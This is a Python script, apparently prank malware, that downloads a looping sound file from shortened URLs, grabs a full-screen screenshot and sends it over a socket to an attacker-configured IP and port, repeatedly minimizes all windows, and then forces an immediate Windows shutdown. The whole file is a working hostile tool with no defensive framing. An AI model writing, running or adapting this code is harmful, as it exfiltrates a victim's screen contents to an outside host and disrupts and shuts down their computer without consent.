from socket import (socket, AF_INET, SOCK_STREAM)
from PIL import (ImageGrab)
from random import (randint)
from os import (path)
from pyautogui import (keyDown, keyUp, press)
from subprocess import (run, PIPE)
import pygame
from threading import (Thread)
from requests import (get)
from time import (sleep)

HOST = '' # Yur IP adress
PORT = 1234




def send_file(filename):
    file_size = path.getsize(filename)
    with socket(AF_INET, SOCK_STREAM) as client_socket:
        client_socket.connect((HOST, PORT))
        with open(filename, 'rb') as file:
            bytes_sent = 0
            while bytes_sent < file_size:
                data = file.read(1024)
                client_socket.send(data)
                bytes_sent += len(data)


def capture_screen(x, y, width, height):
    screenshot = ImageGrab.grab(bbox=(x, y, x + width, y + height))
    screenshot.save('screenshot.png')


def get_screenshot():
    screen_width, screen_height = ImageGrab.grab().size
    capture_screen(0, 0, screen_width, screen_height)


def win_m():

    # pyautogui
    keyDown('win')
    press('m')
    keyUp('win')

def run_cmd(cmd):
    proc = run(cmd, stdout=PIPE)
    output = proc.stdout.decode("utf-8", errors="ignore")
    return output


def play_sound(sound_file):
    """
    播放声音文件

    Args:
        sound_file: 声音文件路径
    """
    sound = pygame.mixer.Sound(sound_file)
    sound.play(loops=-1)


def download_file(url, filename):
    response = get(url, stream=True)
    with open(filename, "wb") as fd:
        for chunk in response.iter_content(chunk_size=525):
            fd.write(chunk)



def download_km3():
    url = \
        [
            "https://shorturl.at/jpwRY",
            "https://reurl.cc/Xmvxb7",
            "https://reurl.cc/NyzO8p"
        ]

    filename = "KM3.hack"
    # try:
    #     download_file(url[0], filename)
    # except Exception:
    #     try:
    #         download_file(url[1], filename)
    #     except Exception:dddddd
    #         download_file(url[2], filename)
    try:
        download_file(url[2], filename)
    except Exception:
        try:
            download_file(url[1], filename)
        except Exception:
            download_file(url[0], filename)
        
    return filename

def main():
    filename = download_km3()

    pygame.init()

    # 创建一个播放声音的线程

    thread = Thread(target=play_sound, args=(filename,))
    thread.daemon = True
    thread.start()

    # while True:
    #     pass

    win_m()
    try:
        get_screenshot()
        send_file('screenshot.png')
    except Exception:
        pass

    # while True:
    #     pass

    win_m()
    for _ in range(0, randint(50, 80)):
        sleep(2)
        win_m()
    run_cmd('shutdown -s -t 0')


if __name__ == '__main__':
    main()
